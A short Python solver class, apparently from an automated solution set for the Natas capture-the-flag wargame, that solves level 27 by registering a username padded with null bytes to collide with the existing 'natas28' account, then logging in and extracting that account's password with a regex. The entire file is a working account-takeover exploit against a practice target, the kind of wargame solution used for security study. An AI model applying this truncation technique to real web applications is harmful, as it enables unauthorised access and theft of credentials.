import re
from .base_solver import NatasSolver

class Natas27Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Create username with null bytes padding
            padded_username = "natas28" + "\x00" * 58 + "anything"
            
            # First request to create user with padding
            response = self.make_request(
                method="POST",
                data={
                    "username": padded_username,
                    "password": "anything"
                }
            )
            
            # Second request to login as normal user
            response = self.make_request(
                method="POST",
                data={
                    "username": "natas28",
                    "password": "anything"
                }
            )
            
            # Extract password using regex
            match = re.findall(r"\[password\] =&gt; (\w+)", response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas27: {str(e)}")